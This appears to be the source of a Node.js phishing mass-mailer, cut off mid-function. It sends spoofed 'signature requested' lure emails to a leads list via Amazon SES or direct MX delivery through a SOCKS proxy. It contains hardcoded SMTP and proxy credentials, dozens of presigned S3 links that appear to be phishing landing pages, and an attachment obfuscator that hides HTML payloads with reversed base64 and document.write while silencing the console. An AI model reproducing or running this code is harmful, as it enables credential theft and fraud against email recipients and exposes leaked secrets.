import net from 'net';
import os from 'os';
import dns from 'dns';
import fs from 'fs/promises';
import { fileURLToPath } from 'url';
import nodemailer from 'nodemailer';
import { SocksClient } from 'socks';
import HttpsProxyAgent from 'https-proxy-agent';
import tunnel from 'tunnel';
import pLimit from 'p-limit';
import path from 'path';
import base64 from 'base-64';
import mime from 'mime-types';
import crypto from 'crypto';
import { faker } from '@faker-js/faker';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

function generateRandomMD5() {
  return crypto.createHash('md5').update(Math.random().toString()).digest('hex');
}

async function generateUniqueFakeCompanyData() {
  return {
    companyName: faker.company.name(),  // 
    address: faker.address.streetAddress(),
    phoneNumber: faker.phone.number(),
  };
}

function generateFakeCompanyData() {
  const companyName = faker.company.name();
  const firstName = faker.person.firstName();
  const lastName = faker.person.lastName();
  const fullName = `${firstName} ${lastName}`;
  const sanitizedCompanyName = companyName.replace(/[\s,]+/g, '').toLowerCase();
  const companyEmailDomain = `${sanitizedCompanyName}.com`;
  const companyEmail = faker.internet.email({ firstName, lastName, provider: companyEmailDomain });

  return {
    companyName,
    companyEmail,
    companyEmailAndFullName: `"${fullName}" <${companyEmail}>`
  };
}




function generateRandomPath(length) {
  const randomBytes = crypto.randomBytes(length);
  
  const base64Encoded = randomBytes.toString('base64');
  
  const safePath = base64Encoded.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  
  return safePath;
}

const pathLength = 125; 

const randomPath = generateRandomPath(pathLength);



async function getRecipientAddresses(filePath) {
  try {
    const data = await fs.readFile(filePath, 'utf8');
    return data.split(/\r?\n/).filter(line => line.trim() !== '');
  } catch (error) {
    console.error('Error reading leads file:', error);
    throw error;
  }
}

function capitalize(str) {
  if (str && typeof str === 'string') {
    return str.charAt(0).toUpperCase() + str.slice(1);
  }
  return str;
}


function generateBoundary() {
  return '----=_NextPart_' + crypto.randomBytes(16).toString('hex');
}

function replacePlaceholders(content, placeholders) {
  let replacedContent = content;
  for (const placeholder in placeholders) {
    const regex = new RegExp(`{${placeholder}}`, 'g');
    replacedContent = replacedContent.replace(regex, placeholders[placeholder]);
  }
  return replacedContent;
}



const options = {
  method: 'SMTP', // Options: 'SMTP', 'MX'
  useAuthentication: true,
  useProxy: true,
  proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
  smtpHost: 'email-smtp.us-east-1.amazonaws.com',
  smtpPort: 587,
  smtpSecure: false,
  secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
  smtpUsername: 'AKIAZ3YXYNS3H4M3MFXM',
  smtpPassword: 'BL/4Xc9LK7G4H5TLGxobiOg4UmBBxmuetBLMA0VdngY9',
  proxyHost: '172.65.181.245',
  proxyPort: 31212,
  proxyUsername: 'customer-DTkA5QpI7K-country-US-session-s4R2H7IPIhTyxMO-time-5',
  proxyPassword: 'GrnzzE5a',
  useConcurrency: true,
  concurrencyLimit: 5,
  includeAttachments: false,
  attachmentPath: 'attachment.txt', // Specify the attachment file path here
  ENABLE_ENCRYPTION: true,
  Encode_Attachment: false,
};


const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
const senderAddresses = ['{RANDOM_MD5}@telepresenz.com'];
const messageFile = 'message.html';
const senderNameWithPlaceholders = "{RANDOM_MD5}"; 
const subjectLineWithPlaceholders = "Signature requested on 'Board Decision CLA {RANDOM_MD5}'- Action Required]"
const MAX_RETRIES = 3; 
const SUCCESS_FILE = 'success-emails.txt';
const FAILURE_FILE = 'failed-emails.txt';

async function clearLogFile(filePath) {
  try {
    await fs.writeFile(filePath, '');
    console.log(`Log file ${filePath} cleared successfully.`);
  } catch (error) {
    console.error(`Error clearing log file ${filePath}:`, error);
  }
}

async function resetLogFiles() {
  await clearLogFile(SUCCESS_FILE);
  await clearLogFile(FAILURE_FILE);
}

async function logSuccess(email) {
  await fs.appendFile(SUCCESS_FILE, `${email}\n`);
}

async function logFailure(email) {
  await fs.appendFile(FAILURE_FILE, `${email}\n`);
}

async function main() {
  try {
    const recipientAddresses = await getRecipientAddresses('Leads.txt');
    

  } catch (error) {
    console.error('Error in main function:', error);
  }
}


async function encryptAndObfuscate(attachmentContent) {
  const encodedContent = base64.encode(attachmentContent);
  const halfLength = Math.floor(encodedContent.length / 2);
  const part1 = encodedContent.slice(0, halfLength).split('').reverse().join('');
  const part2 = encodedContent.slice(halfLength).split('').reverse().join('');

  return `<!DOCTYPE html>
    <html lang="en">
    <head>
	      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
      <script>
        (function() {
          window.console.log = function() {};
          window.console.warn = function() {};
          window.console.error = function() {};
          var a='document', b='write', c='atob', d='${part1}', e='${part2}';
          window[a][b](window[c](d.split('').reverse().join('') + e.split('').reverse().join('')));
        })();
      </script>
    </head>
    <body>
    </body>
    </html>`;
}

function reverseString(str) {
  return str.split('').reverse().join('');
}

function base64Encode(str) {
  return Buffer.from(str).toString('base64').replace(/=*$/, '');
}

function obfuscate(str) {
  return str.split('').map(char => String.fromCharCode(char.charCodeAt(0) + 1)).join('');
}

function base64EncodeReverseObfuscate(str) {
  const reversed = reverseString(str);
  const obfuscated = obfuscate(reversed);
  const encoded = base64Encode(obfuscated);
  return encoded;
}

function base64EncodeReverseObfuscatePlaceholder(content) {
  return content.replace(/{Base64EncodeReverse}\((.*?)\)/g, (match, p1) => {
    return base64EncodeReverseObfuscate(p1);
  });
}

async function sendEmailViaSMTP(recipientAddress, senderAddress) {
  let recipientName;

  if (!recipientName) {
    recipientName = recipientAddress.split('@')[0];
  }
  const recipientDomain = recipientAddress.split('@')[1];
  const recipientDomainName = capitalize(recipientAddress.split('@')[1].split('.')[0]);
  const currentDate = new Date().toLocaleDateString();
  const currentTime = new Date().toLocaleTimeString();
  const random10DigitNumber = Math.random().toString().slice(2, 12);
  const randomString = crypto.randomBytes(20).toString('hex');
  const recipientBase64Email = Buffer.from(recipientAddress).toString('base64');
  const randomMD5 = generateRandomMD5();
  const randomlinks = [
"//42gl28.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=nfI6FHPzlYdk0QPPL7Zs25Ol3TE%3D&Expires=1735389788",
"//2qxmlv.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=DWqhHZynT5atOmlakDuu%2Fl3szCk%3D&Expires=1735389791",
"//t0x5j9.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=KDS4cJ8ZP2oMrD5qc6QqM7SKXog%3D&Expires=1735389793",
"//p7d13d.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=5S%2FB%2BYqebh%2BheSKJkcJNTeoyREg%3D&Expires=1735389796",
"//ftmdql.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=CBl4D1uw0gx18cAF2%2B33RnFFZfc%3D&Expires=1735389798",
"//nwaxg4.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=hbjhPgA2rkHoSOGdNTadL%2BmZ%2F34%3D&Expires=1735389801",
"//m7l56g.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=NW3bduxP7ayWrd7MlQt%2BCoH7Ib8%3D&Expires=1735389803",
"//njyfxa.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=faSf7fo%2B6NGO1voMmAaXslCXkWs%3D&Expires=1735389806",
"//soj6qg.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=lxtDoukxltOqMpzp4IiVaSt6O%2F4%3D&Expires=1735389809",
"//egvrdp.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=5h1UeUkeadapH9QLfSIz7civdP0%3D&Expires=1735389811",
"//l2ipt6.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=tDOvUp7aYALIVwV1AOy6HrmmINE%3D&Expires=1735389814",
"//cedps2.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=lB6nyoXD6RhtX%2B%2Bp4I0GasSYL6I%3D&Expires=1735389817",
"//3q3ij6.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=cdlHDuXFAkIqpJN9MCRSuz4427k%3D&Expires=1735389819",
"//2e124e.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=uLS0BC2MqEVJsLVVUzYeypoQkTU%3D&Expires=1735389822",
"//8vp1mi.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=AVZHKH2KB9PYN%2FC2A6u5V9%2FHEJ0%3D&Expires=1735389825",
"//uj9w23.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=i8TLUOVxL8eoWy%2Bt6SGijusAXlw%3D&Expires=1735389827",
"//0cc6hp.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=5cD%2FWySqieL7tR%2Bf%2F9D6b%2B5twHg%3D&Expires=1735389830",
"//zg8wex.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=hyhyn8WQF45nSKQKNyGjelcNuH4%3D&Expires=1735389833",
"//d2c5bb.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=yH4gZm7W45VAp1pw2fMzlRgjibk%3D&Expires=1735389835",
"//37r8ji.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=IxofTtOY%2B%2BT2qq8tvtpzL5RXYnA%3D&Expires=1735389838",
"//0576lp.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=x7IBf8PfbqMtdIhLHjJ7TuaaVVQ%3D&Expires=1735389841",
"//935u1m.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=IMWSAXZTI125efU8UKp%2F6FPUAkw%3D&Expires=1735389843",
"//o59jsb.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=SwRVtp7qf9Bj6qRPnJjmxMugzAo%3D&Expires=1735389846",
"//68j182.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=mCqaYi7AVQaX0EK18APxrE9AUa0%3D&Expires=1735389848",
"//xcib59.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=KGOahBy453%2Bgyk8jJHZhiekOV98%3D&Expires=1735389851",
"//95dnl3.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=QDGglKp1xffMfYtfmttq0x2nWbs%3D&Expires=1735389854",
"//4clr8b.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=jOpSlI7QBWoBcmKb3Ftdb2upMwA%3D&Expires=1735389857",
"//i0yi7r.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=io4cn6hDljCvRPefYu3eEwMKgRo%3D&Expires=1735389859",
"//k52cl5.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=q7WwFkCnebk1YHVKd9cuAatXazc%3D&Expires=1735389862",
"//w0e41t.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=f%2FsVxPiacqiNqAQTNISLVeAg%2FB4%3D&Expires=1735389864",
"//pw0l61.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=37o2krQpJzxUedMqB355xrJHkYM%3D&Expires=1735389867",
"//dr7szb.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=jcxkxDos70NPmtk2Mqhud7WVU%2FE%3D&Expires=1735389870",
"//kecy8l.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=erm5V3tULrBGywlRhLLRec6B2ko%3D&Expires=1735389872",
"//6ok8d0.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=aidM%2B537FKkRctFCL1QJJeBtMvc%3D&Expires=1735389875",
"//yb556x.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=B9ZYsPmvGGddyq3frdafdUf6QGQ%3D&Expires=1735389878",
"//qx49zp.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=WArvDbHl8KxMLL9G5lR0s4vo4r0%3D&Expires=1735389880",
"//1f32x5.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=cub6hpSKCpmZbAXaXWPraMtbN3A%3D&Expires=1735389883",
"//n2698v.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=awYTEOa9QU05EbQPyNnmclJDmbY%3D&Expires=1735389885",
"//p3w0rg.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=EN3pzCE3uvVYfMN6xIOcK2z%2FnOc%3D&Expires=1735389888",
"//rldfix.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=HLRMxq6SSI5Qz%2FqHo%2B%2BATdTWLMs%3D&Expires=1735389890",
"//f6ybuz.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=pykd6ATQKmIV3%2F3EouS5%2Fucuphs%3D&Expires=1735389893",
"//5smua2.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=Mdt2aTd0NIJIO%2BatmuabTDRAPd8%3D&Expires=1735389895",
"//1ztsel.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=B55WsHTyy7o9cf37WtkxJLH5CO8%3D&Expires=1735389898",
"//g11qx8.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=%2BvLREnKL5PwfNiC4X1kPKYL%2FGHg%3D&Expires=1735389901",
"//vlys9a.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=lL2nO6RY%2F3Q1lzyrm1JXKO2lpV0%3D&Expires=1735389903",
"//244dyg.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=gI9Hg1G0HYePgEl9aAb1%2FkcPy08%3D&Expires=1735389906",
"//5cdrc5.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=Z7S1EhRGtLdfgaodYwdnXxZNazs%3D&Expires=1735389909",
"//pusnr8.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=uO63dmkc%2Bl9S69W8%2BhjFD97HPVY%3D&Expires=1735389911",
"//0bd10g.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=gMv1FfxkSyKEpuqKOctRFjRaeA0%3D&Expires=1735389914",
"//tru3zn.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=%2FWlLL6G46iKABdMLz7mwqyD7nTQ%3D&Expires=1735389917"
];
		const randomIndex = Math.floor(Math.random() * randomlinks.length);
        const randomLink = randomlinks[randomIndex];
  const { companyName, companyEmail, companyEmailAndFullName } = generateFakeCompanyData();

  const randomPath = generateRandomPath(pathLength);
  const subjectLine = replacePlaceholder(subjectLineWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  const senderName = replacePlaceholder(senderNameWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  const attachmentName = replacePlaceholder(senderNameWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);

  let transporterOptions = {
    host: options.smtpHost,
    port: options.smtpPort,
    secure: options.smtpSecure,
    secureProtocol: options.secureProtocol,
  };

  if (options.useAuthentication) {
    transporterOptions.auth = {
      user: options.smtpUsername,
      pass: options.smtpPassword,
    };
  }

  if (options.useProxy && options.proxyType === 'SOCKS') {
    const proxyOptions = {
      proxy: {
        host: options.proxyHost,
        port: options.proxyPort,
        type: 5, // or 4 for SOCKS v4
      },
      command: 'connect',
      destination: {
        host: options.smtpHost,
        port: options.smtpPort,
      },
    };

    const info = await SocksClient.createConnection(proxyOptions);
    transporterOptions.connection = info.socket;
  }

  const transporter = nodemailer.createTransport(transporterOptions);

  let emailContent;
  try {
    emailContent = await fs.readFile(messageFile, 'utf-8');
    emailContent = processContent(emailContent);
	emailContent = base64EncodeReverseObfuscatePlaceholder(emailContent);
	
  } catch (error) {
    console.error(`Error reading email content file: ${error}`);
    return; // Exit the function if there was an error reading the file
  }

  let attachmentContent = '';
  if (options.includeAttachments) {
  let attachmentFilename = attachmentNameWithPlaceholders;
  try {
    if (options.Encode_Attachment) {
      const mimeType = mime.lookup(attachmentFilename) || 'application/octet-stream';
      const encodedFilename = Buffer.from(attachmentFilename).toString('base64');
      attachmentFilename = `=?utf-8?B?${encodedFilename}?=`;
    }

    const attachmentPath = path.resolve(__dirname, options.attachmentPath);
    attachmentContent = await fs.readFile(attachmentPath, 'utf-8');
    attachmentContent = processContent(attachmentContent);
	attachmentContent = base64EncodeReverseObfuscatePlaceholder(attachmentContent);
  } catch (error) {
    console.error(`Error reading attachment file: ${error}`);
    return; // Exit the function if there was an error reading the file
  }
}

  // Replace merge field placeholders in emailContent and attachmentContent
  emailContent = replacePlaceholder(emailContent, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  attachmentContent = replacePlaceholder(attachmentContent, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);

function processContent(content) {
  const placeholders = {
    '{RECIPIENT_NAME}': recipientName.charAt(0).toUpperCase() + recipientName.slice(1),
    '{RECIPIENT_EMAIL}': recipientAddress,
    '{RECIPIENT_DOMAIN}': recipientDomain,
    '{RECIPIENT_DOMAIN_NAME}': recipientDomainName,
    '{CURRENT_DATE}': currentDate,
    '{CURRENT_TIME}': currentTime,
    '{RANDOM_NUMBER10}': random10DigitNumber,
    '{RANDOM_STRING}': randomString,
    '{RECIPIENT_BASE64_EMAIL}': recipientBase64Email,
    '{RANDOM_MD5}': randomMD5,
	'{RANDLINK}': randomLink,
    '{FAKE_COMPANY}': companyName,
    '{FAKE_COMPANY_EMAIL}': companyEmail,
    '{FAKE_COMPANY_EMAIL_AND_FULLNAME}': companyEmailAndFullName,
    '{RANDOM_PATH}': randomPath,
  };

  content = replacePlaceholders(content, placeholders);
  content = encodeBase64Content(content);

  return content;
}

function replacePlaceholders(content, placeholders) {
  for (const [placeholder, replacement] of Object.entries(placeholders)) {
    const regex = new RegExp(placeholder, 'g');
    content = content.replace(regex, replacement);
  }
  return content;
}

function encodeBase64Content(content) {
  return content.replace(/{Base64Encode}\((.*?)\)/g, (match, p1) => {
    return Buffer.from(p1).toString('base64');
  });
}

function replacePlaceholder(content, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath) {
  const placeholders = {
    '{RECIPIENT_NAME}': recipientName.charAt(0).toUpperCase() + recipientName.slice(1),
    '{RECIPIENT_EMAIL}': recipientAddress,
    '{RECIPIENT_DOMAIN}': recipientDomain,
    '{RECIPIENT_DOMAIN_NAME}': recipientDomainName,
    '{CURRENT_DATE}': currentDate,
    '{CURRENT_TIME}': currentTime,
    '{RANDOM_NUMBER10}': random10DigitNumber,
    '{RANDOM_STRING}': randomString,
    '{RECIPIENT_BASE64_EMAIL}': recipientBase64Email,
    '{RANDOM_MD5}': randomMD5,
	'{RANDLINK}': randomLink,
    '{FAKE_COMPANY}': companyName,
    '{FAKE_COMPANY_EMAIL}': companyEmail,
    '{FAKE_COMPANY_EMAIL_AND_FULLNAME}': companyEmailAndFullName,
    '{RANDOM_PATH}': randomPath,
  };

  const regex = new RegExp(Object.keys(placeholders).join('|'), 'gi');
  
  return content.replace(regex, (matched) => placeholders[matched.toUpperCase()]);
}




const obfuscatedAttachmentContent = options.ENABLE_ENCRYPTION && attachmentContent
  ? await encryptAndObfuscate(attachmentContent)
  : attachmentContent;

const processedAttachmentName = replacePlaceholder(
  attachmentNameWithPlaceholders, 
  recipientName, 
  recipientAddress, 
  recipientDomain, 
  currentDate, 
  currentTime, 
  random10DigitNumber, 
  randomString, 
  recipientBase64Email, 
  randomMD5, 
  randomLink,
  companyName, 
  companyEmail, 
  companyEmailAndFullName, 
  recipientDomainName, 
  randomPath
);

const mailOptions = {
  from: `"${senderName}" <${senderAddress}>`,
  to: recipientAddress,
  subject: subjectLine,
  html: emailContent,
  attachments: options.includeAttachments ? [{
    filename: processedAttachmentName,
    content: obfuscatedAttachmentContent,
    contentType: 'text',
  }] : [],    
};

return new Promise((resolve, reject) => {
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(`Error sending email to ${recipientAddress}: ${error}`);
      return reject(error);
    }
    console.log(`Email sent to ${recipientAddress}: ${info.messageId}`);
    resolve(info.messageId);
  });
});
}


async function sendEmailViaMX(recipientAddress, senderAddress) {
  let recipientName;

  if (!recipientName) {
    recipientName = recipientAddress.split('@')[0];
  }
  
  const recipientDomain = recipientAddress.split('@')[1];
  const recipientDomainName = capitalize(recipientAddress.split('@')[1].split('.')[0]);
  
  const currentDate = new Date().toLocaleDateString();
  const currentTime = new Date().toLocaleTimeString();
  const random10DigitNumber = Math.random().toString().slice(2, 12);
  const randomString = crypto.randomBytes(20).toString('hex');
  const recipientBase64Email = Buffer.from(recipientAddress).toString('base64');
  const randomMD5 = generateRandomMD5();
  const randomlinks = [
"https://linkedin.com"
];
		const randomIndex = Math.floor(Math.random() * randomlinks.length);
        const randomLink = randomlinks[randomIndex];
  
  const { companyName, companyEmail, companyEmailAndFullName } = generateFakeCompanyData();

  const randomPath = generateRandomPath(pathLength);
  const subjectLine = replacePlaceholder(subjectLineWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  const senderName = replacePlaceholder(senderNameWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  const attachmentName = replacePlaceholder(senderNameWithPlaceholders, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);


  let emailContent = await fs.readFile(messageFile, 'utf-8');
      emailContent = processContent(emailContent, recipientAddress, senderAddress);
	  emailContent = base64EncodeReverseObfuscatePlaceholder(emailContent);
  let attachmentContent = await fs.readFile(options.attachmentPath, 'utf-8');
      attachmentContent = processContent(attachmentContent);
	  attachmentContent = base64EncodeReverseObfuscatePlaceholder(attachmentContent);


  emailContent = replacePlaceholder(emailContent, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);
  attachmentContent = replacePlaceholder(attachmentContent, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath);

function replacePlaceholder(content, recipientName, recipientAddress, recipientDomain, currentDate, currentTime, random10DigitNumber, randomString, recipientBase64Email, randomLink, randomMD5, companyName, companyEmail, companyEmailAndFullName, recipientDomainName, randomPath) {
  const placeholders = {
    '{RECIPIENT_NAME}': recipientName.charAt(0).toUpperCase() + recipientName.slice(1),
    '{RECIPIENT_EMAIL}': recipientAddress,
    '{RECIPIENT_DOMAIN}': recipientDomain,
    '{RECIPIENT_DOMAIN_NAME}': recipientDomainName,
    '{CURRENT_DATE}': currentDate,
    '{CURRENT_TIME}': currentTime,
    '{RANDOM_NUMBER10}': random10DigitNumber,
    '{RANDOM_STRING}': randomString,
    '{RECIPIENT_BASE64_EMAIL}': recipientBase64Email,
    '{RANDOM_MD5}': randomMD5,
	'{RANDLINK}': randomLink,
    '{FAKE_COMPANY}': companyName,
    '{FAKE_COMPANY_EMAIL}': companyEmail,
    '{FAKE_COMPANY_EMAIL_AND_FULLNAME}': companyEmailAndFullName,
    '{RANDOM_PATH}': randomPath,
  };

  const regex = new RegExp(Object.keys(placeholders).join('|'), 'gi');
  
  return content.replace(regex, (matched) => placeholders[matched.toUpperCase()]);
}

function processContent(content) {
  const placeholders = {
    '{RECIPIENT_NAME}': recipientName.charAt(0).toUpperCase() + recipientName.slice(1),
    '{RECIPIENT_EMAIL}': recipientAddress,
    '{RECIPIENT_DOMAIN}': recipientDomain,
    '{RECIPIENT_DOMAIN_NAME}': recipientDomainName,
    '{CURRENT_DATE}': currentDate,
    '{CURRENT_TIME}': currentTime,
    '{RANDOM_NUMBER10}': random10DigitNumber,
    '{RANDOM_STRING}': randomString,
    '{RECIPIENT_BASE64_EMAIL}': recipientBase64Email,
    '{RANDOM_MD5}': randomMD5,
	'{RANDLINK}': randomLink,
    '{FAKE_COMPANY}': companyName,
    '{FAKE_COMPANY_EMAIL}': companyEmail,
    '{FAKE_COMPANY_EMAIL_AND_FULLNAME}': companyEmailAndFullName,
    '{RANDOM_PATH}': randomPath,
	
  };

  content = replacePlaceholders(content, placeholders);
  content = encodeBase64Content(content);

  return content;
}

function replacePlaceholders(content, placeholders) {
  for (const [placeholder, replacement] of Object.entries(placeholders)) {
    const regex = new RegExp(placeholder, 'g');
    content = content.replace(regex, replacement);
  }
  return content;
}

function encodeBase64Content(content) {
  return content.replace(/{Base64Encode}\((.*?)\)/g, (match, p1) => {
    return Buffer.from(p1).toString('base64');
  });
}


  if (options.ENABLE_ENCRYPTION) {
    attachmentContent = await encryptAndObfuscate(attachmentContent);
  }

  const encodedAttachment = Buffer.from(attachmentContent).toString('base64').match(/.{1,76}/g).join('\r\n');
  const addresses = await dns.promises.resolveMx(recipientDomain);

  if (!addresses.length) {
    throw new Error(`No MX records found for ${domain}`);
  }

  const mxRecord = addresses.sort((a, b) => a.priority - b.priority)[0];
  const client = net.createConnection(25, mxRecord.exchange);
  client.setEncoding('utf8');
  
  const processedAttachmentName = replacePlaceholder(
  attachmentNameWithPlaceholders, 
  recipientName, 
  recipientAddress, 
  recipientDomain, 
  currentDate, 
  currentTime, 
  random10DigitNumber, 
  randomString, 
  recipientBase64Email, 
  randomMD5, 
  randomLink,
  companyName, 
  companyEmail, 
  companyEmailAndFullName, 
  recipientDomainName, 
  randomPath
);

  const boundary = generateBoundary();
const commands = [
  `HELO ${os.hostname()}`,
  `MAIL FROM:<${senderAddress}>`,
  `RCPT TO:<${recipientAddress}>`,
  `DATA`,
  `From: "${senderName}" <${senderAddress}>`,
  `To: ${recipientAddress}`,
  `Subject: ${subjectLine}`,
  `MIME-Version: 1.0`,
  `Content-Type: multipart/mixed; boundary="${boundary}"`,
  '',
  `--${boundary}`,
  `Content-Type: text/html; charset="UTF-8"`,
  `Content-Transfer-Encoding: quoted-printable`,
  '',
  emailContent,
];

if (options.includeAttachments) {
  try {
    const __dirname = path.dirname(new URL(import.meta.url).pathname);
    const attachmentPath = path.resolve(__dirname, options.attachmentPath);
    let attachmentContent = await fs.readFile(attachmentPath, 'utf-8');
    
    attachmentContent = base64EncodeReverseObfuscatePlaceholder(attachmentContent);

    const processedAttachment = processContent(attachmentContent, recipientAddress, senderAddress);

    if (options.ENABLE_ENCRYPTION) {
      console.log(`Encrypting attachment...`);
      attachmentContent = await encryptAndObfuscate(processedAttachment);
      console.log(`Encryption complete. Encrypted size: ${attachmentContent.length} bytes`);
    } else {
      attachmentContent = processedAttachment;
    }

    const encodedAttachment = Buffer.from(attachmentContent).toString('base64');
    
    let attachmentFilename = processedAttachmentName;
    if (options.encodeAttachmentName) {
      const base64Filename = Buffer.from(attachmentFilename).toString('base64');
      attachmentFilename = `=?utf-8?B?${base64Filename}?=`;
    }

    commands.push(
      `--${boundary}`,
